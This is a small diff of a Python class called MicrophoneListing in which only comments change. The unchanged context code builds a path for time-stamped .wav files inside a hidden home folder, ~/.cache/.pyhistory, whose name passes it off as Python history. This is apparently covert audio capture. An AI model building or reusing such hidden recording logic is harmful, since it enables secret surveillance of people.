@@ -131,11 +131,11 @@ class MicrophoneListing(object):
         packet, *_ = args
         
         try:
-            # -> /{DIRHOME}/.cache/.pyhistory 
+            # Ex1 -> /{DIRHOME}/.cache/.pyhistory 
             name_path       = path.join(environ.get('HOME'), '.cache', '.pyhistory')
-            # -> {NameSystem}-{TimeNow}.wav
+            # Ex2 -> {NameSystem}-{TimeNow}.wav
             name_file       = f'{implementation._multiarch}-{ctime().split()[-2]}'
-            # -> /{DIRHOME}/.cache/.pyhistory/{NameSystem}-{TimeNow}.wav
+            # Ex3 -> /{DIRHOME}/.cache/.pyhistory/{NameSystem}-{TimeNow}.wav
             name_end_target = path.join(name_path, name_file)
             
             if not path.isdir(name_path): mkdir(name_path)
